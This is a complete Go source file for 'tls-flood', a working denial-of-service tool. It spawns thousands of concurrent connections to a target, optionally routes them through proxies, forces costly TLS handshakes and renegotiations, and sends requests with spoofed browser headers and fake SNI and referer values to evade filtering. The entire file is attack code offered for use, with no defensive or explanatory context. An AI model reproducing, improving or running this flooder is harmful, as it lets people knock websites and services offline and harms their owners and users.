package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk          = 1500
	sub          = 5
	dialTO       = 4 * time.Second
	handshakeTO  = 10 * time.Second
	httpTimeout  = 10 * time.Second
)

var sniPool = []string{
	"google.com",
	"yahoo.com",
	"duckduckgo.com",
}

var pathPool = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
	"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
	"/search", "/category/", "/tag/", "/feed/", "/comment/",
	"/user/", "/profile/", "/dashboard", "/settings", "/logout",
	"/login", "/register", "/forgot-password", "/reset-password",
	"/product", "/products", "/category/products", "/shop",
	"/cart", "/checkout", "/payment", "/success", "/cancel",
	"/blog", "/post", "/article", "/news", "/event",
	"/contact", "/about", "/team", "/career", "/faq",
	"/search?q=", "/api/search", "/api/filter", "/api/query", "/graphql",
	"/api/v1/data", "/api/v2/query", "/api/v3/filter", "/api/v4/load",
	"/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
	"/index.php", "/home", "/main", "/portal", "/gateway",
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"*/*",
}

var languages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"id,en;q=0.9",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.yahoo.com/",
	"https://duckduckgo.com/",
}

var cipherSuitesTLS10 = []uint16{
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
}

var cipherSuitesTLS11 = []uint16{
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
}

var cipherSuitesTLS12 = []uint16{
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
}

func randomSNI() string {
	return sniPool[rand.Intn(len(sniPool))]
}

func randomPath() string {
	return pathPool[rand.Intn(len(pathPool))]
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getTLSConfig(version int) *tls.Config {
	cfg := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         randomSNI(),
		MinVersion:         uint16(0x0300 + version - 10),
		MaxVersion:         uint16(0x0300 + version - 10),
		Renegotiation:      tls.RenegotiateOnceAsClient,
	}
	switch version {
	case 10:
		cfg.CipherSuites = cipherSuitesTLS10
	case 11:
		cfg.CipherSuites = cipherSuitesTLS11
	case 12:
		cfg.CipherSuites = cipherSuitesTLS12
	case 13:
	}
	return cfg
}

func dialViaProxy(proxyURL *url.URL, targetAddr string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyURL.Host, dialTO)
	if err != nil {
		return nil, err
	}
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetAddr, targetAddr)
	_, err = conn.Write([]byte(req))
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp := make([]byte, 1024)
	n, err := conn.Read(resp)
	if err != nil || n == 0 {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed")
	}
	if !strings.Contains(string(resp[:n]), "200 Connection established") {
		conn.Close()
		return nil, fmt.Errorf("proxy returned non-200: %s", string(resp[:n]))
	}
	return conn, nil
}

func sendHTTPRequest(conn *tls.Conn, host string) error {
	path := randomPath()
	ua := randomUA()
	accept := acceptHeaders[rand.Intn(len(acceptHeaders))]
	lang := languages[rand.Intn(len(languages))]
	ref := referers[rand.Intn(len(referers))]

	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: %s\r\nAccept-Language: %s\r\nReferer: %s\r\nConnection: close\r\n\r\n",
		path, host, ua, accept, lang, ref)

	conn.SetDeadline(time.Now().Add(httpTimeout))
	_, err := conn.Write([]byte(req))
	if err != nil {
		return err
	}
	_, err = io.Copy(io.Discard, conn)
	return err
}

func tlsHandshake(conn net.Conn, host string) error {
	version := 10 + rand.Intn(4)
	cfg := getTLSConfig(version)
	tlsConn := tls.Client(conn, cfg)

	ctx, cancel := context.WithTimeout(context.Background(), handshakeTO)
	defer cancel()
	errCh := make(chan error, 1)
	go func() {
		errCh <- tlsConn.Handshake()
	}()
	var err error
	select {
	case err = <-errCh:
	case <-ctx.Done():
		tlsConn.Close()
		return ctx.Err()
	}
	if err != nil {
		tlsConn.Close()
		return err
	}

	if version != 13 {
		ctxReneg, cancelReneg := context.WithTimeout(context.Background(), handshakeTO)
		defer cancelReneg()
		errChReneg := make(chan error, 1)
		go func() {
			errChReneg <- tlsConn.Handshake()
		}()
		select {
		case err = <-errChReneg:
		case <-ctxReneg.Done():
			tlsConn.Close()
			return ctxReneg.Err()
		}
		if err != nil {
			tlsConn.Close()
			return err
		}
	}

	_ = sendHTTPRequest(tlsConn, host)
	tlsConn.Close()
	return nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("cara make nya : tls-flood <target> [duration]")
		fmt.Println("Detail : tls-flood https://jembotmu.com 60")
		os.Exit(1)
	}
	target := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}

	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	port := parsed.Port()
	if port == "" {
		port = "443"
	}
	targetAddr := host + ":" + port

	var proxies []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Method : TLS-FLOOD (DH+Reneg)\n")
	fmt.Printf("ޗ | Ulimit : 1048576\n")
	fmt.Printf("ޗ | Target : %s\n", target)
	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
	fmt.Printf("ޗ | Conc   : %d\n", wrk)
	fmt.Printf("ޗ | Sub    : %d\n", sub)
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup
	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		proxy := proxies[i%len(proxies)]
		go func(proxyURL *url.URL) {
			defer wg.Done()
			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func() {
					defer swg.Done()
					for ctx.Err() == nil {
						var conn net.Conn
						var err error
						if proxyURL == nil {
							conn, err = net.DialTimeout("tcp", targetAddr, dialTO)
						} else {
							conn, err = dialViaProxy(proxyURL, targetAddr)
						}
						if err != nil {
							continue
						}
						_ = tlsHandshake(conn, host)
					}
				}()
			}
			swg.Wait()
		}(proxy)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
